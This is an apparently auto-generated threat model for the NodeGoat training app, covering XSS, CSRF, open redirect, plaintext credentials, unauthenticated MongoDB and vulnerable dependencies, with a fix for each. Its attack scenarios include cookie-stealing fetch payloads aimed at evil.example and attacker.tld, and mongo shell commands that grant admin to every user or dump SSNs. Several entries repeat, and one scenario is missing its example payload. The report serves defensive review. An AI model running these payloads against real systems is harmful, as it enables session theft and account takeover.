assumptions: Profile fields are stored and re-rendered without a separate encoding step in the handler.
threats.impactReason: Script executing in the victim's page can read the cookie (httpOnly is commented out in server.js) and act as the victim.
threats.likelihoodReason: Any registered user can submit the payload through POST /profile and the escaping default is off application-wide.

mitigation.summary: Turn Swig autoescaping back on and encode any intentionally raw output.
steps: Set autoescape: true in the swig.setDefaults call in server.js:135-142.
Audit templates such as app/views/profile.html for values that relied on raw output and wrap them with node-esapi encoding where HTML is genuinely intended.
Re-enable helmet.contentSecurityPolicy() (server.js:51) as a second layer.

threats.title: Error middleware renders the raw Error object, leaking stack traces to the browser
threats.asset: internal application detail (file paths, stack frames, Mongo query context) returned to the browser
threats.attackScenario: An attacker sends a request that forces an exception (for example GET /allocations/abc so parseInt/Mongo handling throws), and errorHandler in app/routes/error.js:10 passes the whole `err` object into res.render("error-template", { error: err }), so the 500 response carries err.message and err.stack with absolute file paths and internal query details back over the HTTP flow to the browser.
assumptions: Security-relevant events are only sent to console.error and are not captured in any durable audit log.
error-template.html prints the passed error object (message and/or stack) into the rendered page rather than discarding it.
threats.impactReason: Stack traces and paths give an attacker precise internal structure to aim further attacks at, but no direct data records.
threats.likelihoodReason: Triggering an unhandled error needs only a malformed request to any route; the handler is mounted globally at app/routes/index.js:82. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Render a generic error page and keep error internals in server-side logs only.
steps: In app/routes/error.js, pass only a static message to res.render (e.g. { message: "An unexpected error occurred" }) and drop the `error: err` binding.
Keep console.error(err.stack) server-side, and gate any detailed output on process.env.NODE_ENV !== "production".
Update app/views/error-template.html to stop referencing error.stack or error.message.

threats.title: Open redirect on GET /learn sends users to attacker-controlled sites from a trusted link
threats.asset: user trust in application links (and session credentials phished via the redirect)
threats.attackScenario: The handler at app/routes/index.js:72 calls res.redirect(req.query.url) with no allow-list, so an attacker mails a victim a link to https://app/learn?url=https://evil.example/login that renders as a legitimate application URL, and the victim's browser is bounced to a cloned login page where their credentials are captured.
threats.impactReason: Phishing and token-leak via the Referer of the redirect target; the application itself is not compromised but users are credibly deceived by a link on the real domain.
threats.likelihoodReason: Trivially exploitable with a crafted query string; only a logged-in session via isLoggedIn is required, which any self-registered user has.

mitigation.summary: Restrict /learn redirects to an allow-list of internal paths or approved external hosts.
steps: In app/routes/index.js:70-73, parse req.query.url and compare it against a hardcoded allow-list of permitted learning-resource URLs; respond 400 on mismatch.
If only internal navigation is needed, reject any value that is not a relative path starting with a single '/' (block '//host' and 'https:' schemes).
Add a unit test covering url=//evil.example and url=https://evil.example.

threats.title: Unvalidated url parameter on GET /learn permits javascript:/data: scheme injection into the Location header
threats.asset: user trust in application links
threats.attackScenario: GET /learn at app/routes/index.js:70 reads req.query.url with no validation library in the file, so an attacker supplies /learn?url=javascript:fetch('https://evil.example/'+document.cookie) or a CRLF-laden value and the raw string is placed into the Location response header by res.redirect.
assumptions: No upstream middleware sanitises or schema-validates req.query for the /learn route.
threats.impactReason: Depending on the browser and Express version, a non-http scheme or header-splitting payload in Location can lead to script execution or response splitting against the victim.
threats.likelihoodReason: The parameter is directly attacker-controlled on a route reachable by any logged-in user, though modern browsers block most non-http redirect schemes.

mitigation.summary: Validate the url parameter's type and scheme before redirecting.
steps: Assert typeof req.query.url === 'string' in app/routes/index.js:70 before use (Express can supply arrays or objects for repeated/bracketed query keys).
Parse with the Node URL API and accept only the http/https schemes plus hosts on an allow-list.
Strip or reject any value containing CR/LF before it reaches res.redirect.

threats.title: Open redirect on GET /learn used to phish RetireEasy credentials
threats.asset: login credentials of RetireEasy users
threats.attackScenario: The handler at app/routes/index.js:70-72 calls res.redirect(req.query.url) with no allow-list, so an attacker mails a link such as https://retireeasy.example/learn?url=https://retireeasy-login.attacker.tld, the victim sees the trusted host in the link, follows the 302 to the attacker's cloned /login page and submits their username and password there.
threats.impactReason: Harvested credentials give full access to a victim's retirement account data including SSN and bank account fields rendered on /profile.
threats.likelihoodReason: Any logged-in user following a crafted link triggers it; the parameter is taken verbatim with no filtering, so exploitation is a single URL.

mitigation.summary: Restrict /learn redirects to an allow-list of known destinations.
steps: In app/routes/index.js:70, map req.query.url through a fixed dictionary of permitted learning-resource URLs and 400 on any unknown key.
If arbitrary paths must be supported, accept only relative paths that start with a single '/' and reject values containing '//', '\\' or a scheme.

threats.title: Unvalidated url parameter on GET /learn allows javascript:/data: scheme redirects against the session cookie
threats.asset: session cookie of the logged-in user
threats.attackScenario: GET /learn at app/routes/index.js:70 reads req.query.url with no validation library in the file, so an attacker sends a victim /learn?url=javascript:fetch('https://attacker.tld/?c='+document.cookie) or a data: URL and, on browsers that follow the Location scheme, script executes in the application origin and exfiltrates the session cookie, which server.js:95-100 leaves without httpOnly.
assumptions: The victim's browser follows non-http schemes supplied in a Location header, or the attacker chains the redirect to an attacker origin that then abuses the missing cookie flags.
threats.impactReason: A stolen session cookie lets the attacker act as the victim across /profile, /contributions and /allocations.
threats.likelihoodReason: The route is reachable by any authenticated user via a crafted link, though modern browsers block some dangerous redirect schemes.

mitigation.summary: Validate the url query parameter before redirecting.
steps: Parse req.query.url in app/routes/index.js:70 and reject anything whose scheme is not http or https.
Add a shared validation helper for query parameters used by routes in app/routes/index.js.

threats.title: MongoDB wire traffic on the memo-store flow is unauthenticated and unencrypted
threats.asset: plaintext user passwords, SSN and bank details stored in the users collection alongside memos
threats.attackScenario: The connection string used for this flow is mongodb://mongo:27017/nodegoat (docker-compose.yml:8, config/env/all.js:3) with no credentials and no TLS parameters, so an attacker who reaches the container network connects to port 27017 directly, or sniffs the wire protocol carrying memo inserts, and reads or rewrites the users collection containing plaintext passwords, SSN and bank account fields.
assumptions: An attacker can obtain a foothold on the same network segment as the mongo service.
MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
The MongoDB instance is started without authentication enabled and without TLS, matching the credential-free URI in docker-compose.yml and config/env/all.js.
threats.impactReason: The same database connection carries users, allocations, benefits, contributions and profile collections, exposing plaintext passwords and SSN/bank details in one step.
threats.likelihoodReason: Requires network access to the mongo service, which is not exposed to the host, but any container compromise or misconfigured network reaches it without credentials. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection used by the DAOs.
steps: Create a least-privilege MongoDB user and put the credentials in MONGODB_URI via secrets rather than the plain URI in docker-compose.yml.
Start mongo with --auth and --tlsMode requireTLS, and add tls=true plus a CA file to the connection options where MongoClient.connect is called.
Remove the hardcoded fallback URI default in config/env/all.js so the app fails closed when MONGODB_URI is unset.

threats.title: Unvalidated, unbounded memo body written straight into the memos collection
threats.asset: stored memo content shared across all users
threats.attackScenario: addMemos in app/routes/memos.js:13 passes req.body.memo directly to memosDAO.insert with no length, type or quantity check, so an attacker scripts repeated POSTs to /memos with multi-megabyte memo strings; every document is retained forever and getAllMemos (app/data/memos-dao.js:26) loads the entire collection into memory on each GET /memos, making the page unusable for all users.
assumptions: No upstream body-size, rate or quota limit is applied in front of the /memos route in the deployed environment.
threats.impactReason: Memory exhaustion on the render path and unbounded collection growth degrade the shared memos page for every user.
threats.likelihoodReason: A simple loop of POSTs reaches the route; no special privilege is required beyond reaching the form.

mitigation.summary: Validate and bound memo input and paginate reads.
steps: Reject non-string or oversized req.body.memo in app/routes/memos.js before calling memosDAO.insert.
Tighten the body-parser urlencoded/json limit in server.js.
Replace memosCol.find({}) with a limited, paginated query in app/data/memos-dao.js.

threats.title: POST /memos accepts cross-site forged submissions attributed to the victim's session
threats.asset: stored memo content shared across all users
threats.attackScenario: The form in app/views/memos.html:15 posts only a 'memo' field and the route at app/routes/index.js:67 requires only isLoggedIn, so an attacker hosts a page that auto-submits a hidden form to https://retireeasy.example/memos; a logged-in victim who visits it silently publishes attacker-chosen memo text to the collection read by all users, with the action recorded against the victim's session.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
No CSRF token middleware is enabled in front of the memos route, so the browser's session cookie alone authorises the write.
threats.impactReason: Attacker-controlled content is written to a store every user reads, and the write is indistinguishable from the victim's own action.
threats.likelihoodReason: Requires only that a logged-in user load an attacker page; the form takes a single field and no unpredictable token. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require a per-session CSRF token on POST /memos.
steps: Enable the csurf middleware already referenced in server.js and expose res.locals.csrftoken to templates.
Add a hidden csrf token input to the form in app/views/memos.html and reject submissions without a valid token in app/routes/index.js.

threats.title: Memo submissions and session cookies travel over plaintext HTTP
threats.asset: session cookie of the logged-in user
threats.attackScenario: server.js:145 starts the app with http.createServer and the HTTPS block at lines 149-155 is commented out, so an attacker on the same café Wi-Fi as a user reads the POST /memos request, captures the connect.sid session cookie in the clear, and replays it to act as that user or rewrites the memo body in transit.
assumptions: The application is reached directly over HTTP rather than behind a TLS-terminating reverse proxy.
threats.impactReason: Cookie capture gives full account takeover, and the same channel carries profile data such as SSN and bank account numbers.
threats.likelihoodReason: Requires a network position between user and server, which is common on shared or hostile networks.

mitigation.summary: Serve the application over HTTPS and mark session cookies secure.
steps: Re-enable the https.createServer block in server.js or terminate TLS at a proxy and redirect all HTTP traffic.
Set cookie: { httpOnly: true, secure: true } in the express-session options in server.js and enable HSTS.

threats.title: Memo text stored unescaped and rendered to every user of /memos
threats.asset: stored memo content shared across all users and the session cookies of readers
threats.attackScenario: An attacker submits a memo containing raw HTML such as to POST /memos; app/routes/memos.js:13 stores req.body.memo verbatim and app/views/memos.html:31 renders it through marked(doc.memo) under the swig configuration in server.js:135-137 that disables autoescaping, so the payload executes in the browser of every user who opens /memos.
assumptions: The marked sanitize option set in server.js does not neutralise all injected HTML event handlers, so stored markup reaches readers' browsers.
threats.impactReason: A single stored memo executes for every user who visits /memos, exposing session cookies that carry no httpOnly flag and allowing actions as those users.
threats.likelihoodReason: The submission path is open to any logged-in account and no input sanitisation happens before storage; only the marked sanitize setting stands in the way.

mitigation.summary: Escape or sanitise memo content on both input and output.
steps: Strip or encode HTML from req.body.memo in app/routes/memos.js addMemos before calling memosDAO.insert.
Enable swig autoescape in server.js and render memos with an escaping filter instead of relying on marked's deprecated sanitize option.

threats.title: Unbounded memo text posted to POST /memos fills the shared memos collection
threats.asset: availability of the shared memos collection and the /memos page
threats.attackScenario: POST /memos at app/routes/index.js:67 passes req.body.memo straight to memosDAO.insert in app/routes/memos.js:13 with no length cap or rate limit, so an authenticated attacker scripts thousands of requests carrying multi-megabyte memo bodies and the getAllMemos query in app/data/memos-dao.js:26 then loads every document on each page render, exhausting database storage and making /memos unusable for all users.
assumptions: No rate limiting or request body size cap beyond body-parser defaults is applied in front of POST /memos.
threats.impactReason: The memos collection is shared by every user, so flooding it degrades the page for the whole tenant and consumes database storage.
threats.likelihoodReason: Any self-registered, logged-in account can loop the POST; no special position is needed, but authentication is required.

mitigation.summary: Bound memo size and submission rate, and paginate memo retrieval.
steps: Reject memos over a fixed character length in app/routes/memos.js addMemos before calling memosDAO.insert.
Apply a per-session rate limit to POST /memos in app/routes/index.js:67.
Change getAllMemos in app/data/memos-dao.js to apply .limit() and skip rather than returning the entire collection.

threats.title: Stored XSS in memos via marked 0.3.5 sanitizer bypass rendered with swig autoescape disabled
threats.asset: stored memo content shared across all users and other users' session cookies
threats.attackScenario: An attacker POSTs to /memos (app/routes/index.js:67) with a memo body containing an HTML-entity-encoded or data-URI payload that bypasses marked@0.3.5's sanitize option (CVE-2016-10531, CVE-2017-1000427); memos-dao.js stores it verbatim in the memos collection and app/views/memos.html line 31 renders it through {{ marked(doc.memo) }} with swig autoescape disabled, so the script executes in every user who later loads GET /memos and exfiltrates their non-httpOnly session cookie.
threats.impactReason: Memos are shared across all users, so one payload hits every viewer and the session cookie has no httpOnly flag, enabling account takeover including admin accounts.
threats.likelihoodReason: The vulnerable marked version and the unescaped template render are both present and the submit form is a single POST away for any user.

mitigation.summary: Upgrade marked and stop rendering memo content as raw HTML.
steps: Bump marked in package.json past 0.3.7 (ideally the current release) and re-test the memo rendering.

Escape the output of marked in app/views/memos.html instead of relying on the deprecated sanitize option, or pass memo text through a dedicated HTML sanitiser before res.render in app/routes/memos.js.
Re-enable swig autoescape (server.js setDefaults) so template values are escaped by default.

threats.title: Memo writes are unattributable because no author or actor is recorded
threats.asset: audit trail for memo submissions
threats.attackScenario: memosDAO.insert in app/data/memos-dao.js:15 stores only {memo, timestamp} and app/routes/memos.js never attaches req.session.userId to the document, so an attacker posts a defamatory or XSS-bearing memo to /memos and the operators have no record linking the memo to any account, allowing the poster to deny it.
assumptions: No separate request/audit log records the posting identity for /memos in the deployed environment.
threats.impactReason: Abusive or malicious memos cannot be traced to an account, hampering incident response after a stored-XSS incident.
threats.likelihoodReason: Any user submitting the memo form produces an unattributed record; no effort is needed.

mitigation.summary: Record the submitting user with each memo and log the request.
steps: Pass req.session.userId into memosDAO.insert and persist it as an author field in app/data/memos-dao.js.
Reject memo submissions from sessions with no userId in app/routes/memos.js.
Emit a server-side log entry containing user id, timestamp and memo id on each POST /memos.

threats.title: No authentication on the MongoDB service permits unlogged tampering with benefit and allocation records
threats.asset: benefit start dates and allocation/contribution records in the users, allocations and contributions collections
threats.attackScenario: docker-compose.yml starts mongo:4.4 exposing 27017 on the internal network with no credentials and MONGODB_URI carries no user or password, so any other container or anyone who gains a foothold on that network connects with mongo shell and runs db.users.update({},{$set:{isAdmin:true}}) or rewrites benefitStartDate values written by app/data/benefits-dao.js, with no per-connection identity recorded to attribute the change.
assumptions: MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
No network policy restricts which workloads can reach port 27017.
The MongoDB deployment runs without authentication and without database-level auditing, as the compose definition and the credential-free connection string imply.
threats.impactReason: Records that drive benefits and admin privilege can be silently rewritten, and no audit trail exists to detect or attribute it.
threats.likelihoodReason: Requires a position on the internal network, but once there no credential is needed at all. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable MongoDB authentication, per-service least-privilege users and auditing.
steps: Add --auth and a root credential to the mongo service in docker-compose.yml and create an application user with readWrite only on the nodegoat database.
Supply the credentials to the web service via MONGODB_URI as an injected secret rather than the literal default in config/env/all.js:3.
Enable MongoDB audit logging (or at minimum the profiler on write operations) and ship the log off-host.

threats.title: Passwords stored in plaintext in the MongoDB users collection
threats.asset: plaintext user passwords in the users collection
threats.attackScenario: Because app/data/user-dao.js:61 compares the submitted password to the stored value with `fromDB === fromUser`, the users collection holds passwords as cleartext, so anyone who reaches the mongo service (for example via the unauthenticated mongo:4.4 container defined in docker-compose.yml, or via a dump of the database) runs db.users.find({}) and walks away with every user's login password for credential-stuffing on other sites.
assumptions: The users collection is the same store written by UserDAO.addUser, so the stored password field is the one compared at line 61.
threats.impactReason: Every account password is directly usable, and users commonly reuse them, so the blast radius extends beyond this application.
threats.likelihoodReason: Any read access to the database, including from another container on the internal network, yields the credentials with no cracking effort.

mitigation.summary: Store salted bcrypt hashes and compare with bcrypt instead of ===.
steps: In app/data/user-dao.js addUser, hash the password with bcrypt.hashSync(password, 10) before inserting the user document.
Replace the comparePassword helper at app/data/user-dao.js:61 with bcrypt.compareSync(fromUser, fromDB).
Add a migration in artifacts/db-reset.js that rehashes or invalidates existing plaintext passwords and forces a reset.

threats.title: Sensitive profile fields (SSN, bank account, routing number) persisted unencrypted
threats.asset: stored SSN, date of birth and bank account/routing numbers
threats.attackScenario: ProfileDAO.updateUser at app/data/profile-dao.js:42 writes ssn, dob, bankAcc and bankRouting straight into the users collection with the encrypt/decrypt helpers left commented out at lines 15-40, so an attacker with read access to the mongo container (which docker-compose.yml starts with no authentication) runs db.users.find({},{ssn:1,bankAcc:1,bankRouting:1}) and exfiltrates every employee's identity and banking details.
assumptions: MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
No encryption-at-rest is configured on the MongoDB deployment or volume.
The commented-out crypto helpers in profile-dao.js are not re-implemented elsewhere in the write path.
threats.impactReason: SSNs and bank routing/account numbers enable identity theft and fraud and cannot be rotated.
threats.likelihoodReason: Requires access to the database or its storage, but the compose-defined mongo service has no authentication on the internal network. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Encrypt sensitive profile fields before persisting them and enable storage encryption.
steps: Re-enable the crypto helpers in app/data/profile-dao.js using crypto.createCipheriv with a per-record random IV stored alongside the ciphertext, not in shared config.
Move the key out of config/env/all.js into an environment variable or secrets manager.
Enable MongoDB authentication and encryption at rest for the mongo service in docker-compose.yml.

threats.title: Vulnerable mongodb 2.2.36 driver allows denial of service of the database connection layer
threats.asset: availability of the users, allocations, contributions and memos collections
threats.attackScenario: package.json:18 pins mongodb@2.2.36, which is affected by GHSA-mh5c-679w-hh4r; an attacker who can reach a route that passes attacker-influenced values into the driver (for example the allocation and contribution lookups in app/data/allocations-dao.js and app/data/contributions-dao.js) triggers the driver defect and stalls or crashes the shared connection held by MongoClient.connect in server.js, taking every collection offline for all users.
assumptions: The deployed application installs the declared 2.2.36 version rather than a patched transitive override.
threats.impactReason: All data access fails while the single shared driver connection is unusable, but no data is disclosed or altered.
threats.likelihoodReason: The advisory is public and the vulnerable version is declared, though exploitation depends on reaching the affected driver code path.

mitigation.summary: Upgrade the MongoDB driver past the fixed release.
steps: Raise the mongodb dependency in package.json from 2.2.36 to at least 3.1.13 and run npm audit.
Adapt the DAO call sites in app/data/*.js to the 3.x callback/promise API (notably insert/update to insertOne/updateOne).
Add restart and healthcheck settings for the web service in docker-compose.yml so a stalled connection is recovered.

threats.title: CSRF protection is disabled, allowing forced profile and benefit updates
threats.asset: user profile records including SSN and bank account details
threats.attackScenario: csurf is a declared dependency at package.json:11 but `app.use(csrf())` and the csrftoken template local are commented out at server.js:104-113, so an attacker hosts a page that auto-submits a form to POST /profile with attacker-chosen bankAcc and bankRouting fields and any logged-in victim who visits it has their payout bank details rewritten using their ambient session cookie.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
The application relies on the session cookie alone for state-changing POSTs with no SameSite attribute or token check elsewhere.
threats.impactReason: Bank routing and account fields on the victim's profile can be silently rewritten, redirecting benefit payments.
threats.likelihoodReason: Exploitation needs a logged-in victim to visit an attacker page, but no token or origin check stands in the way. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable the already-installed csurf middleware and add SameSite cookies.
steps: Uncomment `app.use(csrf())` and the res.locals.csrftoken middleware at server.js:104-113.
Add the hidden csrftoken field to every POST form under app/views (profile, contributions, benefits, memos, login, signup).
Set `cookie: { sameSite: 'lax', httpOnly: true }` in the express-session options at server.js:78.

threats.title: Session cookie signed with a hardcoded secret committed in config/env/all.js
threats.asset: user session state and the cookie secret
threats.attackScenario: server.js:82 initialises express-session with `secret: cookieSecret` taken from config/config, and config/env/all.js:8 defines cookieSecret as a literal string checked into the repository with no process.env fallback, so an attacker who reads the public source forges a signed connect.sid cookie for an administrator's session id and reaches /benefits and other logged-in pages without credentials.
assumptions: The deployed instance uses the committed config/env/all.js value rather than an environment-supplied secret, since only db and port read from process.env in that file.
threats.impactReason: A forged session cookie yields full impersonation of any user, including admin functions over SSN and bank details.
threats.likelihoodReason: The secret is a source-code literal in a repository and the login page is internet reachable; forging a signed cookie needs only the secret.

mitigation.summary: Load the session secret from the environment and rotate the committed value.
steps: Change config/env/all.js:8 to `cookieSecret: process.env.COOKIE_SECRET` and fail startup when it is unset.
Set COOKIE_SECRET as an environment variable in docker-compose.yml alongside MONGODB_URI and treat the committed value as compromised.
Enable cookie options in server.js:78 (httpOnly, secure, maxAge) once the secret is externalised.

threats.title: Express open redirect and redirect XSS from unpatched express 4.16.4
threats.asset: user session state and rendered user data
threats.attackScenario: express@4.16.4 is pinned at package.json:13 and is affected by CVE-2024-29041 (open redirect on malformed URLs) and CVE-2024-43796 (XSS via response.redirect), so an attacker crafts a malformed URL against the res.redirect call in the /learn handler and obtains either a redirect to an external host or script execution in the redirect response body, stealing the victim's session cookie.
threats.impactReason: Redirect-based XSS executes in the application origin and can read the non-httpOnly session cookie.
threats.likelihoodReason: The application exposes a res.redirect call fed by user input, and exploit details for both CVEs are public.

mitigation.summary: Upgrade express to 4.20.0 or later.
steps: Change the express dependency in package.json:13 to "^4.20.0" and reinstall.
Re-test the /learn redirect path after the upgrade together with the allow-list fix in app/routes/index.js.

threats.title: Open redirect on GET /learn sends authenticated users to attacker-controlled sites
threats.asset: user session state and user credentials phished after redirect
threats.attackScenario: The /learn handler at app/routes/index.js:70-73 passes req.query.url straight into res.redirect with no allow-list or validation, so an attacker sends a logged-in user a link to /learn?url=https://evil.example/login that renders a NodeGoat look-alike login page under the trusted origin's link and harvests their credentials.
assumptions: No upstream middleware rewrites or filters req.query.url before the handler runs.
threats.impactReason: Redirect abuse enables credential phishing and token leakage to third-party hosts, though it does not directly read the database.
threats.likelihoodReason: The redirect target is fully attacker-controlled through a query string and only requires an authenticated victim to click a link.

mitigation.summary: Validate the redirect target against an allow-list of known learning-resource URLs.
steps: In app/routes/index.js:70, compare req.query.url against a fixed map of permitted destinations and redirect to a default page when it does not match.
Reject absolute URLs whose host is not in the allow-list; only permit relative paths beginning with a single '/'.

threats.title: Stored XSS through disabled swig autoescaping and commented-out helmet CSP
threats.asset: user session state (session cookie) and rendered user data
threats.attackScenario: server.js:135-142 sets swig `autoescape: false` and the helmet contentSecurityPolicy / session httpOnly cookie blocks at server.js:51 and 95-100 are commented out, so an attacker posts a memo containing `<script>fetch('//evil.example/?c='+document.cookie)</script>` via POST /memos and every user who loads /memos executes it and leaks their connect.sid session cookie.
assumptions: The memos view renders the stored memo through swig without an explicit escape filter.
threats.impactReason: Script execution in every viewer's browser steals readable session cookies and can perform actions as the victim, including admin benefit updates.
threats.likelihoodReason: Any registered user can store a memo and templates render unescaped by configuration, with no CSP to blunt exfiltration.

mitigation.summary: Re-enable swig autoescaping, helmet CSP and httpOnly session cookies.
steps: Set `autoescape: true` in the swig.setDefaults call at server.js:135.
Uncomment and configure `app.use(helmet.contentSecurityPolicy())` and the other helmet middleware in server.js:38-65.
Uncomment the session cookie block at server.js:92-100 so the cookie is httpOnly (and secure once HTTPS is used).

threats.title: Unhandled error template returns stack traces to the client and leaves no audit trail
threats.asset: internal server paths, Mongo driver internals and the absent audit record of attacks
threats.attackScenario: The error middleware at app/routes/error.js:3-13 renders the whole `err` object into error-template and writes only err.message and err.stack to console, so an attacker sends a malformed value to a route such as /allocations/notanumber, reads the returned stack trace to learn file paths and driver versions, and the probing leaves no attributable security log entry tying it to a session or source address.
assumptions: No separate audit log records authentication or authorization events for later attribution.
Security-relevant events are only sent to console.error and are not captured in any durable audit log.
error-template renders fields of the passed err object into the HTML response.
threats.impactReason: Leaked paths and stack frames aid further exploitation, and missing attributable logs mean probing and account misuse cannot be reconstructed.
threats.likelihoodReason: Any unauthenticated request that triggers an exception reaches the handler; no special access is needed. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Return a generic error page and emit structured, attributable security logs.
steps: In app/routes/error.js, render error-template with a static message and log the stack server-side only.
Log userId, session id, route and source IP for login, signup, profile update and allocation access events to a persistent store rather than console.

threats.title: Any logged-in user can read another user's retirement allocations via /allocations/:userId
threats.asset: other users' benefit and allocation records
threats.attackScenario: GET /allocations/:userId at app/routes/index.js:63 is guarded only by isLoggedIn and never compares :userId to the session user, so an attacker registers via POST /signup, notes their own numeric userId in the URL, and iterates /allocations/1, /allocations/2 ... to read every other user's stocks, funds and bonds allocations together with their name.
assumptions: allocationsHandler.displayAllocations does not itself re-check the session user against the :userId path parameter.
threats.impactReason: All users' financial allocation records and names become readable one sequential id at a time.
threats.likelihoodReason: Self-service signup is available and user ids are small integers generated by a counter, so enumeration is trivial.

mitigation.summary: Enforce an ownership (or admin) check on the allocations route.
steps: In app/routes/index.js:63, add a middleware that returns 404 unless req.params.userId equals the session user id, or the session user is admin (sessionHandler.isAdminUserMiddleware already exists).
Alternatively drive displayAllocations from the session user id and drop the path parameter entirely.

threats.title: Known-vulnerable express, body-parser and marked versions allow request-driven denial of service
threats.asset: availability of the NodeGoat Express server
threats.attackScenario: package.json pins body-parser@1.18.3, marked@0.3.5 and express@4.16.4, all with published advisories, so an attacker posts a crafted urlencoded body to any form route such as POST /memos to trigger CVE-2024-45590 in body-parser, or submits markdown that hits the marked CVE-2022-21681 catastrophic regex, and pegs the single Node process so no user can reach /dashboard.
threats.impactReason: The Express app is a single process behind forever, so CPU exhaustion takes the whole application offline for all users.
threats.likelihoodReason: The vulnerable parsers sit on every request path and the advisories are public with known payloads.

mitigation.summary: Upgrade the vulnerable direct dependencies to their fixed versions.
steps: Raise body-parser to >=1.20.3, express to >=4.20.0 and marked to >=4.0.10 in package.json and adapt the marked.setOptions call at server.js:126 to the newer API.
Add `npm audit --production` to the CI scripts in package.json so regressions are caught.

threats.title: Profile data written to MongoDB over an unauthenticated, unencrypted wire connection
threats.asset: SSN, bank account and routing numbers, and plaintext user passwords in the users collection
threats.attackScenario: The web service connects with MONGODB_URI=mongodb://mongo:27017/nodegoat in docker-compose.yml, which carries no credentials and no TLS option, so an attacker with a foothold on any other container on the compose network connects directly to mongo:27017 and reads or rewrites the users collection's ssn, bankAcc and password fields as the profile-persist flow writes them.
assumptions: MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
No network policy isolates the web container from other workloads that can reach mongo:27017.
The mongo:4.4 service is started without --auth and without TLS, so the connection string in docker-compose.yml reflects the deployed configuration.
threats.impactReason: Full read and write access to the users collection exposes SSNs, bank details and passwords and allows silent tampering with benefit and allocation records.
threats.likelihoodReason: Requires network adjacency to the mongo service rather than internet reachability, but no credential is needed once that position is held. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection used by the DAOs.
steps: Start the mongo service in docker-compose.yml with --auth and create a least-privilege application user for the nodegoat database.
Change MONGODB_URI to include those credentials and tls=true, sourcing them from environment variables rather than literals.
Keep the mongo port on an internal network only and do not publish it.

threats.title: Unlogged profile updates leave no record of who changed SSN or bank details
threats.asset: audit trail for changes to bank account and routing numbers
threats.attackScenario: handleProfileUpdate at app/routes/profile.js:40 overwrites bankAcc and bankRouting for the session's userId and ProfileDAO.updateUser writes the new values with no audit entry, so an attacker who rides a victim's session redirects payroll to their own account and the victim can later deny, and the operator cannot prove, who submitted the change.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
No request or change-audit logging middleware is registered upstream of the profile routes.
threats.impactReason: Fraudulent bank detail changes cannot be attributed or reconstructed, hampering both detection and dispute resolution.
threats.likelihoodReason: Any authenticated session, including one obtained through a forged cross-site POST to /profile, reaches the update path. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Write an immutable audit record for every profile field change.
steps: In app/routes/profile.js handleProfileUpdate, emit a structured log entry containing userId, session id, source IP, timestamp and which fields changed before calling profile.updateUser.
Persist the previous and new values of bankAcc and bankRouting to a separate append-only collection rather than overwriting in place.

threats.title: SSN, DOB and bank details written to the users collection in plaintext by ProfileDAO
threats.asset: users' SSN, date of birth, home address and bank account/routing numbers
threats.attackScenario: ProfileDAO.updateUser at app/data/profile-dao.js:42 stores ssn, dob, address, bankAcc and bankRouting straight onto the user document with the encrypt()/decrypt() helpers left commented out at lines 15-40, so anyone who obtains a copy of the MongoDB data files, a backup, or a connection to mongo:27017 reads every user's SSN and bank account number in clear text.
assumptions: The commented-out crypto helpers in app/data/profile-dao.js are the only field-level encryption in the application, so profile fields reach MongoDB unencrypted.
threats.impactReason: SSNs and bank account/routing numbers for every user are directly readable, enabling identity theft and financial fraud.
threats.likelihoodReason: Requires access to the database or its backups rather than an unauthenticated HTTP request, but the mongo service is reachable from any container on the compose network.

mitigation.summary: Encrypt sensitive profile fields before they are persisted, using a key that is not checked into source.
steps: Re-enable and correct the crypto helpers in app/data/profile-dao.js so ssn, dob, bankAcc and bankRouting are encrypted with a per-record IV that is stored alongside the ciphertext.
Load the encryption key from an environment variable instead of the literal cryptoKey in config/env/all.js.
Decrypt on read inside getByUserId so callers are unchanged.

threats.title: ReDoS on POST /profile bank routing validation stalls the Node event loop
threats.asset: availability of the profile service and the whole Express process
threats.attackScenario: The bankRouting field is validated with the nested-quantifier regex /([0-9]+)+\#/ at app/routes/profile.js:59, so an attacker logs in and POSTs /profile with bankRouting set to a long digit string with no trailing '#' (for example 40 zeros), causing catastrophic backtracking that pins the single Node event loop and makes every route unresponsive.
threats.impactReason: A single request blocks the single-threaded Express process, denying service to all users of the application, not just the attacker.
threats.likelihoodReason: The route is a normal authenticated form POST and the payload is a trivial string of digits; no special tooling is needed.

mitigation.summary: Remove the outer quantifier from the routing-number regex and bound the input length.
steps: Replace /([0-9]+)+\#/ at app/routes/profile.js:59 with the linear pattern /^[0-9]+#$/ as the in-file comment already suggests.
Reject bankRouting values longer than a fixed maximum (e.g. 16 characters) before running the regex.

threats.title: Cross-site request forgery overwrites SSN and bank details via POST /profile
threats.asset: the victim's stored profile record: SSN, date of birth, address and bank account/routing numbers
threats.attackScenario: The POST /profile flow to the handler at app/routes/index.js:48 carries only the express-session cookie and no anti-CSRF token — csurf is commented out at server.js:7 and server.js:104-113 and the form at app/views/profile.html:38 renders no token field — so an attacker hosts a page that auto-submits a hidden form to http://host/profile with attacker-chosen bankAcc and bankRouting values, and a logged-in victim who visits it has their payout bank account silently replaced.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
No SameSite attribute is set on the session cookie, so browsers send it on the cross-site form POST.
threats.impactReason: An attacker can rewrite the bank account and routing number used for retirement payouts, and corrupt identity fields, without ever reading them.
